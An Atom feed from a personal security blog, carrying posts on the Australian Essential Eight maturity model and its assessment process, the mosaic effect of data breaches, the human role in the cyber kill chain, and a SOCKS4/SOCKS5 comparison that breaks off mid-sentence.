<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://emdeh.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://emdeh.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2023-11-27T00:52:16+00:00</updated><id>https://emdeh.github.io/feed.xml</id><title type="html">emdeh</title><subtitle>If you can&apos;t explain it simply, you don&apos;t understand it well enough. </subtitle><entry><title type="html">Essential Eight Maturity Model annual update</title><link href="https://emdeh.github.io/blog/2023/update-to-essential-eight/" rel="alternate" type="text/html" title="Essential Eight Maturity Model annual update"/><published>2023-11-26T16:00:00+00:00</published><updated>2023-11-26T16:00:00+00:00</updated><id>https://emdeh.github.io/blog/2023/update-to-essential-eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/update-to-essential-eight/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>As mentioend in <a href="https://emdeh.com/news/announcement_7"> this news item</a>, the updates draw upon various sources, including cyber threat intelligence, feedback from government and industry sectors globally, insights from penetration tests, Essential Eight assessments, uplift activities, and responses to ASD’s annual cyber survey.</p> <p>Key areas of focus in the latest update include:</p> <ol> <li>Balancing patching timeframes to ensure timely response to vulnerabilities.</li> <li>Increasing the adoption of phishing-resistant multifactor authentication to enhance security.</li> <li>Improving the management of cloud services, considering their growing importance and unique security challenges.</li> <li>Enhancing incident detection and response capabilities, particularly for internet-facing infrastructure, to quickly identify and mitigate potential breaches.</li> </ol> <p>The following summarises the for each maturity level.</p> <h2 id="maturity-level-one-updates">Maturity Level One updates</h2> <ol> <li>Patch Applications: Tightens response times for critical vulnerabilities and increases frequency of vulnerability scanning for high-risk software.</li> <li>Patch Operating Systems: Similar changes as for applications, emphasizing quicker responses for critical vulnerabilities.</li> <li>Multi-Factor Authentication (MFA): Removes opt-out option for certain online services and adds new requirements for MFA implementation.</li> <li>Restrict Administrative Privileges: Introduces validation for privileged access requests and limits internet access for privileged accounts.</li> <li>Application Control: Shifts from using NTFS permissions to employing application control solutions.</li> <li>User Application Hardening: Focuses on disabling or removing Internet Explorer 11 and logging command line process creation events.</li> <li>Regular Backups: No significant change.</li> </ol> <h2 id="maturity-level-two-updates">Maturity Level Two updates</h2> <p>Maturity Level Two implements the same changes as Level One, with additional changes:</p> <ol> <li>Phishing-resistant MFA for various user authentication scenarios.</li> <li>Centralised event log retention and monitoring for signs of compromise.</li> <li>Mandatory incident reporting and response plan enactment.</li> <li>Application control rule validation and Microsoft’s recommended application blocklist implementation.</li> </ol> <h2 id="maturity-level-three-udpates">Maturity Level Three udpates</h2> <p>Level Three includes Level One and Two changes, with the following additional requirements:</p> <ol> <li>Additional requirements for patching drivers and firmware.</li> <li>Enhanced administrative privilege restrictions, including the use of Secure Admin Workstations and enhanced Windows security features.</li> <li>Specific requirements for handling Microsoft Office macros, including digital signing and checking for malicious code.</li> </ol> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model-changes"> Essential Eight Maturity Model Changes</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[The November 2023 update of the Essential Eight Maturity Model introduces several changes across three maturity levels.]]></summary></entry><entry><title type="html">Assessment planning and scoping</title><link href="https://emdeh.github.io/blog/2023/assessment-planning-scoping/" rel="alternate" type="text/html" title="Assessment planning and scoping"/><published>2023-11-24T11:00:00+00:00</published><updated>2023-11-24T11:00:00+00:00</updated><id>https://emdeh.github.io/blog/2023/assessment-planning-scoping</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/assessment-planning-scoping/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>The planning and scoping stages of an assessment are essential for structuring the process and ensuring that the security insights gained accurately represent the environment being assessed. It’s vital to take into account the context in which an organisation operates, including the threat landscape during this stage. In this context, the threat landscape can mean the primary threat the organisation is facing. For example, insider threats or external threats - including the level of threat sophistication.</p> <p>Assessors should examine the organisation’s policies and procedures, conduct comprehensive tests of technical controls pertinent to each strategy, and assess their effectiveness. Determining the desired maturity level of the organization under assessment is key to guiding the assessment and establishing the appropriate scope and methods.</p> <p>The type and quality of evidence collected will play a role in the assessment outcomes, so it’s critical to ensure that the evidence gathered is of high quality and reliable as this will underpin the report’s conclusions and recommendations.</p> <p>When there are mandatory requirements for the implementation of the Essential Eight, there is a need for assessment to attest the level of maturity of the organisation’s cyber security controls. The assessment process, however, is intended to provide an organisation with actionable insights. For this reason, organisations who do not have a mandated requirement, will still find regular assessment helpful as a way to identify improvements.</p> <blockquote> <p><strong><em>Non-corporate entities within the Australian Government are typically required to obtain a Maturity Level Two within the broader context of the mandatory Protective Security Policy Framework (PSPF).</em></strong></p> </blockquote> <p>The following sections describe the four assessment stages.</p> <h2 id="stage-1---assessment-planning-and-preparation">Stage 1 - Assessment planning and preparation</h2> <p>During this stage pre-planning is undertaken to build a contextual overview of the organisation and the threat landscape it operates in. The assessor will aim to gain an understanding of the infrastructure, the teams the assessor will need to interact with, and the skills required to complete the assessment.</p> <p>As part of planning, the assessor should discuss the following with the asset owner:</p> <ul> <li>Determine asset classification and assessment scope.</li> <li>Requirements around access to low and high-privileged user accounts, devices, documentation, personnel, and facilities.</li> <li>Any approvals required to run scripts and tools within the environment.</li> <li>Evidence collection and protection requirements, including following the conclusion of the assessment.</li> <li>Finalising approval to use tools and scripts on sample systems/servers/networks.</li> <li>Requirements for where the assessment report will be developed (e.g. on the organisation’s system or externally).</li> <li>How stakeholder engagement and consultation should be approached, including confirming key points of contact.</li> <li>Whether any managed service providers support or manage any aspects of the system(s) under assessment; including appropriate points of contact if so.</li> <li>Obtaining copies of any previously completed assessment reports for the system.</li> <li>Agreement on appropriate use, retention and marketing of the assessment report by both parties.</li> </ul> <p>At the end of this stage, the assessor should have developed the assessment test plan.</p> <h2 id="stage-2---assessment-scoping">Stage 2 - Assessment scoping</h2> <p>Different maturity levels will impact aspects or components of the assessment. During this stage the assessor should become familiar with the requirements for the target maturity level, so the assessment approach and test plan can be adjusted accordingly.</p> <blockquote> <p><strong><em>The Essential Eight should be implemented and assessed as a package. If a system has not previously been assessed and demonstrated to meet Maturity Level One, that system should not be assessed for Maturity Level Two. Likewise, a system should be assessed and demonstrated to meet Maturity Level Two before being assessed for Maturity Level Three.</em></strong></p> </blockquote> <p>As part of determining the appropriate assessment approach, the assessor should conduct the following activities:</p> <ul> <li>Make use of asset registers that describe the environment to determine the applicability of the Essential Eight.</li> <li>Conduct workshops with the system owners to identify and agree on the precise assessment scope, including out-of-scope items.</li> <li>Agree with system owners on the assessment duration and milestones.</li> <li>Obtain an approximate breakdown of the operating systems used within the environment.</li> <li>Determine the necessary sample size to accurately represent all in-scope assets and types of assets.</li> <li>Document any assessment limitations, including sample sizes and constraints in the assessment report.</li> </ul> <h3 id="evidence-quality">Evidence quality</h3> <p>Assessments should strive to gather and use the highest calibre of evidence to effectively support the conclusions on the effectiveness of controls. Evidence quality requirements should be considered and discussed at this stage.</p> <p>It’s important to use a mix of both qualitative and quantitively techniques, as these will often complement each other and allow for cross-referencing. Qualitative techniques may included reviewing documentation and interviewing system administrators. Quantitative techniques could include reviewing system configurations or utilising tools and scripts.</p> <p>When conducting assessments, the quality of evidence can typically be categorised as follows:</p> <table> <thead> <tr> <th>Quality</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td>Excellent evidence</td> <td>Testing a control with a simulated activity that is designed to validate it is implemented <em>and</em> effective (e.g. attempting to run an application to check application control rulesets).</td> </tr> <tr> <td>Good evidence</td> <td>Review configuration settings of a system <em>through the system’s interface</em> (not screenshots or as-built documentation) to determine whether it a control should theoretically be enforced.</td> </tr> <tr> <td>Fair evidence</td> <td>Review a copy of a system’s configuration (e.g. using reports or screenshots) to determine whether it should enforce an expected control.</td> </tr> <tr> <td>Poor evidence</td> <td>A policy or verbal statement of intent (e.g. sighting mention of controls within artefacts such as as-built documents).</td> </tr> </tbody> </table> <p><br/></p> <h2 id="stage-3---assessment-of-controls">Stage 3 - Assessment of controls</h2> <p>At this stage the effectiveness of the controls within the Essential Eight are tested against the target Maturity Level.</p> <p>ACSC ahs developed standardised assessment outcomes which must be used.</p> <p>Each control can be assessed as:</p> <ul> <li><strong>Effective</strong>: The organisation is effectively meeting the control’s objective.</li> <li><strong>Ineffective</strong>: The organisation is not adequately meeting the control’s objective.</li> <li><strong>Alternate control:</strong> The organisation is effectively meeting the control’s objective through an alternate control.</li> <li><strong>Not assessed:</strong> The control has not yet been assessed.</li> <li><strong>Not applicable:</strong> The control does not apply to the system or environment.</li> <li><strong>No visibility:</strong> The assessor was unable to obtain adequate visibility of a control’s implementation.</li> </ul> <p>Importantly, the Essential Eight Maturity Model does not allow for risk acceptance without compensating controls. If a system owner has accepted a risk with no compensating controls, the mitigation strategy must be considered not implemented.</p> <p>Moreover, when evaluating the efficacy of compensating controls, it’s important to verify that the level of protection the compensating control(s) offer is commensurate to that prescribed by the Essential Eight to protect against the level of adversarial tradecraft for the target Maturity Level.</p> <blockquote> <p><strong><em>There is no scope in the Essential Eight model that allows for risks to be accepted without commensurate compensating controls.</em></strong></p> </blockquote> <h2 id="stage-4---development-of-the-assessment-report">Stage 4 - Development of the assessment report</h2> <p>In the final stage, the assessor will develop the security assessment report.</p> <h3 id="understanding-maturity-levels">Understanding maturity levels.</h3> <p>The report will contextualise the assessment against the Maturity Model. The Maturity Model contains four levels that provide a way for an organisation to measure its progress in implementing the Essential Eight while also identifying areas for improvement.</p> <p>There are three target levels, based on increasingly sophisticated levels of adversarial tradecraft. Level 0 exists for designating instances where the requirements of the first maturity level are not met.</p> <p>At <strong>Maturity Level 0</strong> weaknesses exist in the overall cyber security posture. This is also the default starting position if no assessment has been done previously.</p> <p>At <strong>Maturity Level One</strong> the focus is on protection against malicious actors who are content to simply leverage widely available tradecraft. This level maturity does not offer protection against APT tradecraft or other persistent threats, including insider threats.</p> <p>At <strong>Maturity Level Two</strong> a level of protection is reached that is sufficient to mitigate threats from malicious actors who are willing to invest more time in a target and in the effectiveness of their tools.</p> <p>At <strong>Maturity Level Three</strong> the focus is on threats who are more adaptive and much less reliant on public tools and techniques, such as state-sponsored actors, military operations, other APTs.</p> <h3 id="report-validity">Report validity</h3> <p>There’s no expiry date on the assessment report. Theoretically an assessment could be indefinite but assessors should be cautious of relying on previous report that are aged, and should consider doing a gap analysis to determine any deviations from succeeding changes to the Essential Eight, as well as changes within the environment itself.</p> <h3 id="treatment-and-exceptions">Treatment and exceptions</h3> <p>The use of exceptions for a system need to be documented and approved by an appropriate authority through a formal process. For government entities, the appropriate authority may be defined in the broader PSPF.</p> <p>Documentation for exceptions should include the scope and justification for the exception, as well as the following detail of the compensating controls:</p> <ul> <li>Reason, scope, and justification for compensating controls.</li> <li>Anticipated implementation lifetime of the compensating control(s).</li> <li>The review schedule of the compensating control.</li> <li>The system risk rating before and after the compensating control was implemented.</li> <li>Any caveats around the use of the system because of the exception.</li> <li>The formal acceptance from the appropriate authority of any residual risk for the system.</li> <li>When the need for the exception will next be considered by the appropriate authority, noting exceptions should not be approved beyond one year.</li> </ul> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-assessment-process-guide">Essential Eight Assessment Process Guide | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model">Essential Eight Maturity Model | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model-faq">Essential Eight Maturity Model FAQ | Cyber.gov.au</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[The four stages of assessment]]></summary></entry><entry><title type="html">Overview of Essential Eight</title><link href="https://emdeh.github.io/blog/2023/overview-of-essential-eight/" rel="alternate" type="text/html" title="Overview of Essential Eight"/><published>2023-11-20T23:50:00+00:00</published><updated>2023-11-20T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2023/overview-of-essential-eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/overview-of-essential-eight/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>Sometimes it’s helpful to contextualise what something <em>isn’t.</em> That is certainly the case with the Australian Signals Directorate’s <strong>Essential Eight</strong> <em>Strategies to Mitigate Cyber Security Incidents</em>.</p> <p>Often the Essential Eight and its Maturity Model are conflated with the Australian Government’s broader <em>Protective Security Policy Framework (PSPF),</em> which has its own Maturity Model.</p> <p>So, to begin lets set the scene.</p> <h3 id="where-did-the-essential-eight-come-from">Where did the Essential Eight come from?</h3> <p>In February 2010, the <em>Strategies to Mitigate Cyber Security Incidents</em> was published as an attempt to summaries the <em>Information Security Manual.</em> Seven years later a revision added a degree of relative security effectiveness to these 37 strategies. Eight of these were marked <em>Essential</em>, thus giving rise to the Essential Eight.</p> <p>Notably, the Essential Eight are not the <em>Easy Eight</em>. Nor is it the minimum needed for an effective cyber security posture. Instead, see it as a prioritisation. If you’re not sure where to start on a cyber security program of work, start with the Essential Eight.</p> <p>Indeed, the PSPF is quite explicit abbot this. <em>Policy 10: Safeguarding data from cyber threats</em> states that entities must mitigate common cyber threats by implementing the Essential Eight and considering what remaining 29 strategies need to be implemented to achieve an acceptable level of residual risk.</p> <blockquote> <p><strong><em>The Essential Eight is not all that you need to do. Policy 10 creates a requirement for entities to consider what remaining mitigation strategies they need to achieve an acceptable level of residual risk.</em></strong></p> </blockquote> <h3 id="whos-it-for">Who’s it for?</h3> <p>The Essential Eight is not designed for all environments. It focuses on Microsoft Windows environments and may not be as relevant for other settings, such as IoT or Operational Technology.</p> <p>Increasingly, government directives and legislative instruments are mandating the application of the Essential Eight as a risk management program.</p> <ul> <li>The PSPF mandates it for most government entities at the Federal level</li> <li>Some state governments have mandated it including, Victoria, Queensland, and New South Wales.</li> <li>Entities designated as Critical Infrastructure (Security of Critical Infrastructure Act 2018)</li> </ul> <h2 id="categorising-the-37-strategies">Categorising the 37 strategies</h2> <p>The strategies are categorised into five types:</p> <ol> <li>Preventing Malware delivery and execution.</li> <li>Limiting the extent of Cyber Security Incidents.</li> <li>Detecting Cyber Security Incidents and responding.</li> <li>Recovering data and system availability after a Cyber Security incident.</li> <li>Preventing malicious insiders.</li> </ol> <div class="row"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-480.webp"/> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-800.webp"/> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-1400.webp"/> <img src="/assets/img/20231120-strategiestomitigatecybersecurityincidents.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="Strategies to Mitigate Cyber Secyurity Incidents" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Source: <a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents"> cyber.gov.au </a> </div> <p>The strategies are also tagged against three further dimensions:</p> <ol> <li>Potential User Resistance</li> <li>Upfront cost</li> <li>Ongoing maintenance cost</li> </ol> <p>How these dimensions were baselined isn’t clear; presumably it’s relative.</p> <p>For the Essential Eight there are:</p> <ul> <li>Four <em>preventing</em> strategies.</li> <li>Three <em>limiting</em> strategies.</li> <li>One <em>recovering</em> strategy.</li> </ul> <h2 id="where-to-start">Where to start?</h2> <p>Logically, the advice is to follow a risk-based approach and start with strategies that mitigate the threats of most concern. This will look different for different organisations. The <em>Strategies to Mitigate Cyber Security Incidents</em> decompose this into the four following categories.</p> <h3 id="targeted-cyber-intrusions-and-other-external-malicious-actors-who-steal-data">Targeted cyber intrusions and other external malicious actors who steal data.</h3> <h4 id="step-1">Step 1</h4> <p>In this category, the first step is to implement the essential mitigation strategies that: a. prevent malware payload delivery and execution, b. limit the extent of cyber security incidents, and c. recover data and system availability.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> <li>Regular backups</li> </ol> <h4 id="step-2">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detect, preventative, and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Automated dynamic analysis of email and web content run in a sandbox.</li> <li>Email content filtering</li> <li>Web content filtering</li> <li>Deny corporate computers direct internet connectivity</li> <li>Operating system generic exploit mitigation</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3">Step 3</h4> <p>Lastly, consider what remaining strategies are requires to achieve an acceptable level of residual risk.</p> <h3 id="ransomware-and-external-malicious-actors-who-destroy-data">Ransomware and external malicious actors who destroy data</h3> <h4 id="step-1-1">Step 1</h4> <p>For this category, the first step is to implement the Essential Eight that: a. recover data and system availability, b. prevent malware payload delivery and execution, and b. limit the extent of cyber security incidents.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Regular backups</li> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> </ol> <h4 id="step-2-1">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detecting, preventative, and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Automated dynamic analysis of email and web content run in a sandbox.</li> <li>Email content filtering</li> <li>Web content filtering</li> <li>Deny corporate computers direct internet connectivity</li> <li>Operating system generic exploit mitigation</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3-1">Step 3</h4> <p>Lastly, consider what remaining strategies are requires to achieve an acceptable level of residual risk.</p> <h3 id="malicious-insiders-who-steal-data">Malicious insiders who steal data.</h3> <h4 id="step-1-and-2">Step 1 and 2</h4> <p>For this category, the first step is to implement data exfiltration by implementing the strategy <em>‘Control removable storage media and connected devices’</em>. Second is to implement the limiting strategy: <em>Outbound web and email data loss prevention’.</em></p> <p><strong>Step 1 and 2 implementation order:</strong></p> <ol> <li>Control removable storage media and connected devices.</li> <li>Outbound web and email data loss prevention.</li> </ol> <h4 id="step-3-2">Step 3</h4> <p>Next is to implement the Essential Eight <em>limiting</em> strategies, as well as those that allow <em>detection and response</em>.</p> <p><strong>Step 3 implementation order:</strong></p> <ol> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> <li>Continuous incident detection and response</li> </ol> <h4 id="step-4">Step 4</h4> <p>Then repeat the third step for strategies that have an effectiveness rating of excellent in the limiting category and also implement the preventative strategy of Personnel Management.</p> <p><strong>Step 4 implementation order:</strong></p> <ol> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> <li>Personnel management</li> </ol> <h4 id="step-5">Step 5</h4> <p>Lastly, if employees are likely to have the technical cyber security capabilities, implement the remaining Essential Eight strategies to prevent malware delivery, then repeat step 3 with less effective mitigation strategies to achieve an acceptable level of residual risk.</p> <p><strong>Step 5 implementation order:</strong></p> <ol> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> </ol> <h3 id="malicious-insiders-who-destroy-data-and-prevent-systems-functioning">Malicious insiders who destroy data and prevent systems functioning.</h3> <h4 id="step-1-2">Step 1</h4> <p>For this category, the first step is to implement the Essential Eight that: a. recover data and system availability, and b. limit the extent of cyber security incidents.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Regular backups</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> </ol> <h4 id="step-2-2">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detecting and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3-3">Step 3</h4> <p>Next, implement the preventative strategy of Personnel Management and, again, if employees are likely to have the technical cyber security capabilities, implement the remaining Essential Eight strategies to prevent malware delivery, then repeat step 3 with less effective mitigation strategies to achieve an acceptable level of residual risk.</p> <p><strong>Step 3 implementation order:</strong></p> <ol> <li>Personnel Management</li> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> </ol> <h2 id="where-to-start-1">Where to start</h2> <p>When implementing a strategy, first implement for high risk users and computers such as those who access to important data and/or are exposed to untrustworthy internet content. Then implement it for all other users and computers.</p> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight"> Essential Eight | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents"> Strategies to Mitigate Cyber Security Incidents | Cyber.gov.au </a></li> <li><a href="https://www.protectivesecurity.gov.au/policies"> Policies | Protective Security Policy Framework </a></li> <li><a href="https://www.protectivesecurity.gov.au/publications-library/policy-10-safeguarding-data-cyber-threats"> Policy 10: Safeguarding data from cyber threats | Protective Security Policy Framework </a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[Where did the Essential Eight come from, and who's it for?]]></summary></entry><entry><title type="html">The Mosaic Effect</title><link href="https://emdeh.github.io/blog/2023/mosaic-effects/" rel="alternate" type="text/html" title="The Mosaic Effect"/><published>2023-11-08T23:50:00+00:00</published><updated>2023-11-08T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2023/mosaic-effects</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/mosaic-effects/"><![CDATA[<p>An older post resurrected from another platform, because it will always be relevant.</p> <p>Despite the more high-profile breaches of late, the impact of the mosaic effect remains understated. This <h ref="https://www.abc.net.au/news/2023-05-18/data-breaches-your-identity-interactive/102175688">interactive article&lt;/a&gt; from the ABC and the creator of <h ref="https://haveibeenpwned.com/">';--have i been pwned?&lt;/a&gt; visually (and scarily) gets the point across with - well, mosaics! A timely reminder to minimise the PII we give out and not to re-use passwords.</h></h></p> <h1 id="what-is-the-mosaic-effect">What is the Mosaic Effect?</h1> <p>The mosaic effect demonstrates how seemingly innocuous pieces of information, when combined, can create a detailed and revealing picture of an individual’s identity, much like tiles forming a complete mosaic. Each data breach, no matter how insignificant it may seem, can contribute another tile to this unintended portrait. This piecemeal approach to data collection and the subsequent risk of re-identification in data sets that were thought to be anonymous or de-identified is an increasingly prominent concern in the digital age.</p> <p>The risk also extends beyond the individual and into organizations. Inadvertent disclosure of sensitive information through various seemingly harmless data releases can lead to security vulnerabilities, making companies an unwitting participant in this digital patchwork of information.</p> <h1 id="what-can-you-do">What can you do?</h1> <p>Aside from minimising the PII and not re-using passwords, the more cautious among us may want to consider using masked emails and pseudo-anonymising your PII for online services.</p> <p>Masked emails are aliases that forward to your real email, helping keep your actual email address out of the public domain. This can be a valuable tool in combating phishing attempts. Pseudo-anonymising data, or replacing private identifiers with fake identifiers or pseudonyms, can reduce the risk of identity theft or data misuse.</p> <p>Password managers are more than just convenience tools; they’re a crucial component in the fight against the mosaic effect. They encourage strong, unique passwords for every account and service, making it difficult for attackers to piece together your digital identity even if they gain access to one set of credentials.</p> <p>The mosaic effect underscores the need for a proactive approach to data privacy. By being vigilant about the data we share and how we protect it, we can thwart the efforts of those who seek to piece together our digital lives. Protecting our real identities only takes a little effort but can have a profound impact on our digital security and privacy.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="security-awareness"/><category term="awareness"/><category term="education"/><category term="mosaic-effect"/><category term="PII"/><category term="passwords"/><summary type="html"><![CDATA[See your identity pieced together from stolen data.]]></summary></entry><entry><title type="html">Human Disruption - Breaking the Cyber Kill Chain</title><link href="https://emdeh.github.io/blog/2023/cyber-kill-chain/" rel="alternate" type="text/html" title="Human Disruption - Breaking the Cyber Kill Chain"/><published>2023-11-05T15:14:00+00:00</published><updated>2023-11-05T15:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/cyber-kill-chain</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/cyber-kill-chain/"><![CDATA[<h1 id="what-is-the-cyber-kill-chain-model">What is the Cyber Kill Chain Model?</h1> <p>The ‘kill chain’ concept is a borrowed military term that outlines the stages of an adversary’s attack methodology. Intercepting attackers at multiple points increases the likelihood of disrupting the threat or forcing the adversary to take more detectable actions.</p> <p>The prevailing application of kill chain models focuses on technology and overlooks the human element. Incorporating human aspects, like security awareness and end-user education, isn’t just another security control; it’s a unique approach to managing the fallibility humans introduce into any system or process.</p> <h1 id="applying-the-human-element-to-cyber-kill-chains">Applying the human element to Cyber Kill Chains</h1> <p>Distilling a kill chain into its constituent steps is often highly context-dependent. In general, however, it can be conceptualised into the following categories:</p> <ol> <li>Reconnaissance</li> <li>Weaponisation</li> <li>Delivery</li> <li>Exploitation</li> <li>Persistence</li> <li>Command &amp; Control</li> <li>Actions on Objectives</li> </ol> <p>The following will briefly consider the human element at each step and how it can disrupt or detect an attack.</p> <h2 id="reconnaissance">Reconnaissance</h2> <p><em>Threat actors conduct preliminary information gathering.</em></p> <p>An informed workforce or user-base, understanding their role as potential targets, can significantly reduce information leakage by exercising caution on social media, verifying identities over the phone, and securely disposing of sensitive documents. While not a strategy that can mitigate the risk completely, these practices can impede an attacker’s reconnaissance efforts.</p> <h2 id="weaponisation">Weaponisation</h2> <p><em>Threat actors prepare appropriate tactics, techniques, and tools without direct contact with the target.</em></p> <p>Limited security measures can disrupt this phase, except where a threat actor conducts preliminary testing on the target, in which case, an informed user-base can act as additional “sensors” of IoCs.</p> <h2 id="delivery">Delivery</h2> <p><em>The threat actor launches the attack against the target.</em></p> <p>While technical solutions strive to block this phase, human intuition and adaptability can also play a crucial role. People are often the first line of defence in recognising and countering attacks, especially those involving social engineering.</p> <h2 id="exploitation">Exploitation</h2> <p><em>The threat actor executes the attack by, for example, exploiting vulnerabilities.</em></p> <p>Educated users are more likely to maintain updated systems and use security software, reducing the chances of successful exploitation.</p> <h2 id="persistence">Persistence</h2> <p><em>Threat actors, particularly APTs, will attempt to establish persistence to a compromised target</em></p> <p>If an attack has reached this stage, technical solutions are arguably the best line of defence, but humans can, again, play a crucial role. With their daily interaction with systems, users are ideally positioned to notice anomalies in performance or behaviour that could be symptomatic of an attack.</p> <h2 id="command--control">Command &amp; Control</h2> <p><em>Compromised systems contact external servers for further instructions.</em></p> <p>Proactive threat hunting aims to identify such suspicious communications.</p> <h2 id="actions-on-objectives">Actions on Objectives</h2> <p><em>Threat Actors will pursue their ultimate goal within the compromised network.</em></p> <p>Again, security-conscious behaviours by users - such as using strong passwords and scrutinising login activities - can complicate attackers’ efforts, enhancing the organisation’s detection capabilities and delaying lateral movement, data exfiltration, or privilege escalation.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="security-awareness"/><category term="awareness"/><category term="cyber-kill-chain"/><category term="kill-chain"/><category term="education"/><summary type="html"><![CDATA[A brief overview of the importance of the human element in disrupting cyber kill chains.]]></summary></entry><entry><title type="html">SOCKS4 vs SOCKS5</title><link href="https://emdeh.github.io/blog/2023/socks/" rel="alternate" type="text/html" title="SOCKS4 vs SOCKS5"/><published>2023-10-31T14:14:00+00:00</published><updated>2023-10-31T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/socks</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/socks/"><![CDATA[<h2 id="what-is-socks">What is SOCKS</h2> <p>SOCKS stands for “SOCKet Secure” and is a protocol used for proxy servers. The protocol establishes a TCP connection to another server behind a firewall. The term “socket” refers to the combination of an IP address and port number.</p> <p>Here are the primary differences between SOCKS4 and SOCKS5:</p> <h2 id="socks4">SOCKS4</h2> <ul> <li><strong>Protocol Support</strong>: Supports TCP only.</li> <li><strong>Authentication</strong>: Doesn’t support authentication natively. Anyone with the proxy address and port can use it.</li> <li><strong>Hostname Resolution</strong>: Cannot resolve hostnames; requires the client to resolve the hostname to an IP address.</li> </ul> <h2 id="socks5">SOCKS5</h2> <ul> <li><strong>Protocol Support</strong>: Supports TCP and UDP.</li> <li><strong>Authentication</strong>: Provides a range of authentication mechanisms, including no authentication, username/password, and GSS-API.</li> <li><strong>Hostname Resolution</strong>: Can resolve hostnames, which means you can pass a domain name that SOCKS5 will resolve for you.</li> </ul> <p>Here’s a simple comparison in terms of features:</p> <table> <thead> <tr> <th>Feature</th> <th>SOCKS4</th> <th>SOCKS5</th> </tr> </thead> <tbody> <tr> <td>TCP Support</td> <td>✅</td> <td>✅</td> </tr> <tr> <td>UDP Support</td> <td>❌</td> <td>✅</td> </tr> <tr> <td>Authentication</td> <td>❌</td> <td>✅</td> </tr> <tr> <td>Hostname Resolution</td> <td>❌</td> <td>✅</td> </tr> </tbody> </table> <p>SOCKS5 is generally considered more secure and versatile due to its advanced features like authentication and support for both TCP and UDP 